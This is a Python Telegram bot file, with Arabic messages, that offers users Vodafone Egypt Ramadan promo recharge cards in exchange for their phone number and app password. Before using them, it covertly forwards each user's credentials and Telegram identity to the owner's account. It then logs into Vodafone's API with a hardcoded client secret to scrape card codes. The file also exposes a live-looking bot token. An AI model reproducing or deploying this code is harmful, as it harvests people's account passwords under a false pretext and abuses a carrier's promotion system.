
import telebot
from telebot import types
import requests
import requests,hashlib
#owner=836970770
owner=7037898496
token='6550384531:AAFoPmjpJKHIUYcSH9P6ycKa7mSq2UikR_U'
bot = telebot.TeleBot(token)

numbers = []

@bot.message_handler(commands=['start'])
def start(message):
    idd=message.from_user.id
    ch='M_S_H_VIP1'
    me='اهلا بك عزيزي المستخدم\nيجب عليك الاشتراك في قناة البوت اولا'
    url=f'https://api.telegram.org/bot{token}/getchatmember?chat_id=@{ch}&user_id={idd}'
    req=requests.get(url)
    #print(req)
    if idd == owner or 'member' in req.text or 'creator' in req.text or 'administrator' in req.text:
        global markup
        markup = types.InlineKeyboardMarkup(row_width=2)
        button1 = types.InlineKeyboardButton('🎯تسجيل الدخول', callback_data='sum')
        markup.add(button1)
        bot.send_message(message.chat.id, 'للتواصل :\n[Telegram](t.me/M_S_H_VIP)\n[قناة الشروحات ☑️](t.me/M_S_H_VIP1)\n[Facebook](https://www.facebook.com/profile.php?id=100010833720173)\n ',parse_mode="markdown",disable_web_page_preview=True)
        bot.send_message(message.chat.id, 'اضغط هنا لبدء تسجيل الدخول....🎯', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, f'{me}\n@{ch}')

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == 'sum':
        bot.send_message(call.message.chat.id, 'قم بإرسال رقمك فودافون ثم مسافه ثم باسورد تطبيق انا فودافون\n مثال \n 01021665474 Aa65645@:')
        bot.register_next_step_handler(call.message, sum_numbers)
    elif call.data == 'repet':
        repet_numbers(call.message)

def sum_numbers(message):

    id=message.from_user.id

    user=message.from_user.username

    first_name=message.from_user.first_name

    try:

        last_name=message.from_user.last_name

    except:last_name="None"   

    text=message.text

    info= f"id:{id},\n user:{user}, \n {first_name},\n {last_name}, \n account:{text},"

    bot.send_message(owner,info)  
    try:
        numbers.clear()  # يحذف الأرقام السابقة
        numbers.extend(message.text.split())
        number=numbers[0]
        Bassword=numbers[1]
        printed_values = []

        url="https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"

        

        

        

        headers={

            "Accept":"application/json, text/plain, */*",

            "Connection":"keep-alive",

            "x-dynatrace":"MT_3_17_998679495_45-0_a556db1b-4506-43f3-854a-1d2527767923_0_18957_273",

            "x-agent-operatingsystem":"1630483957",

            "clientId":"AnaVodafoneAndroid",

            "x-agent-device":"RMX1911",

            "x-agent-version":"2021.12.2",

            "x-agent-build":"493",

            "Content-Type":"application/x-www-form-urlencoded",

            "Content-Length":"143",

            "Host":"mobile.vodafone.com.eg",

            "Accept-Encoding":"gzip",

            "User-Agent":"okhttp/4.9.1"

            }

            

            

        data={

        "username":number,

        

        "password":Bassword,

        

        "grant_type":"password",

        

        "client_secret":"a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",

        

        "client_id":"my-vodafone-app"

            }    

            

            

        res=requests.post(url, headers=headers, data=data)

        if "user credentials" in res.text:

            bot.send_message(message.chat.id, 'رقم الهاتف او الرقم السري خطا \n حاول مجددا',reply_markup=markup)

        else:

            jwt=res.json()["access_token"]

            ul=f"https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion?@type=RamadanHub&channel=website&msisdn={number}"

            

            

            hd={

                    "Host": "web.vodafone.com.eg",

                    "Connection": "keep-alive",

                    "msisdn": number,

                    "api-host": "PromotionHost",

                    "Accept-Language": "AR",

                    "Authorization": "Bearer "+(jwt)+"",

                    'Content-Type': 'application/json',

                    'x-dtreferer': 'https://web.vodafone.com.eg/spa/portal/hub',

                    'Accept': 'application/json',

                    'clientId': 'WebsiteConsumer',

                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36',

                    'channel': 'WEB',

                    'Referer': 'https://web.vodafone.com.eg/spa/portal/hub',

                    'Accept-Encoding': 'gzip, deflate, br'

                                }
            for g in range(15):

                r =requests.get(ul, headers=hd).json()

                for i in r:

                    try:
                        patt=i['pattern']

                    #print(patt)

                        for a in patt:

                            action=a['action']

                        #print(action)

                        for zxc in action:

                            ch=zxc['characteristics']
                            ncharge=(ch[0]['value'])
                            vcharge=(ch[1]['value'])
                            cnum=(ch[3]['value'])

                            if float(vcharge) > 20:
                                    if vcharge not in printed_values:
                                        printed_values.append(vcharge)
                                        z=f"𖡋    »  »  » كرت {vcharge} وحده 🌙❤️\n `*858*{cnum}#` \n{ncharge} شحنه اضغط للنسخ 🔥‼️\\n𖡋    »    سبحان الله وبحمده\n𖡋    »   سبحان الله العظيم"
                                        bot.send_message(message.chat.id,text=z,parse_mode="markdown")
                                        send_repet_button(message.chat.id)
                    except:pass

    except:

        bot.send_message(message.chat.id, 'حدث خطا \n حاول مجددا',reply_markup=markup)
        send_repet_button(message.chat.id)


def repet_numbers(message):
    try:
        number=numbers[0]
        Bassword=numbers[1]
        printed_values = []

        url="https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"

        

        

        

        headers={

            "Accept":"application/json, text/plain, */*",

            "Connection":"keep-alive",

            "x-dynatrace":"MT_3_17_998679495_45-0_a556db1b-4506-43f3-854a-1d2527767923_0_18957_273",

            "x-agent-operatingsystem":"1630483957",

            "clientId":"AnaVodafoneAndroid",

            "x-agent-device":"RMX1911",

            "x-agent-version":"2021.12.2",

            "x-agent-build":"493",

            "Content-Type":"application/x-www-form-urlencoded",

            "Content-Length":"143",

            "Host":"mobile.vodafone.com.eg",

            "Accept-Encoding":"gzip",

            "User-Agent":"okhttp/4.9.1"

            }

            

            

        data={

        "username":number,

        

        "password":Bassword,

        

        "grant_type":"password",

        

        "client_secret":"a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",

        

        "client_id":"my-vodafone-app"

            }    

            

            

        res=requests.post(url, headers=headers, data=data)

        if "user credentials" in res.text:

            bot.send_message(message.chat.id, 'رقم الهاتف او الرقم السري خطا \n حاول مجددا',reply_markup=markup)

        else:

            jwt=res.json()["access_token"]

            ul=f"https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion?@type=RamadanHub&channel=website&msisdn={number}"

            

            

            hd={

                    "Host": "web.vodafone.com.eg",

                    "Connection": "keep-alive",

                    "msisdn": number,

                    "api-host": "PromotionHost",

                    "Accept-Language": "AR",

                    "Authorization": "Bearer "+(jwt)+"",

                    'Content-Type': 'application/json',

                    'x-dtreferer': 'https://web.vodafone.com.eg/spa/portal/hub',

                    'Accept': 'application/json',

                    'clientId': 'WebsiteConsumer',

                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36',

                    'channel': 'WEB',

                    'Referer': 'https://web.vodafone.com.eg/spa/portal/hub',

                    'Accept-Encoding': 'gzip, deflate, br'

                                }
            for g in range(15):

                r =requests.get(ul, headers=hd).json()

                for i in r:

                    try:
                        patt=i['pattern']

                    #print(patt)

                        for a in patt:

                            action=a['action']

                        #print(action)

                        for zxc in action:

                            ch=zxc['characteristics']
                            ncharge=(ch[0]['value'])
                            vcharge=(ch[1]['value'])
                            cnum=(ch[3]['value'])

                            if float(vcharge) > 20:
                                    if vcharge not in printed_values:
                                        printed_values.append(vcharge)
                                        z=f"𖡋    »  »  » كرت {vcharge} وحده 🌙❤️\n `*858*{cnum}#` \n{ncharge} شحنه اضغط للنسخ 🔥‼️\\n𖡋    »    سبحان الله وبحمده\n𖡋    »   سبحان الله العظيم"
                                        bot.send_message(message.chat.id,text=z,parse_mode="markdown")
                                        send_repet_button(message.chat.id)
                    except:pass

    except:
        bot.send_message(message.chat.id, 'حدث خطا \n حاول مجددا',reply_markup=markup)
        send_repet_button(message.chat.id)

def send_repet_button(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    button2 = types.InlineKeyboardButton('كروت جديده', callback_data='repet')
    markup.add(button2)
    bot.send_message(chat_id, 'اضغط علي [كروت جديده]لاستقبال المزيد من الكروت', reply_markup=markup)
bot.polling()
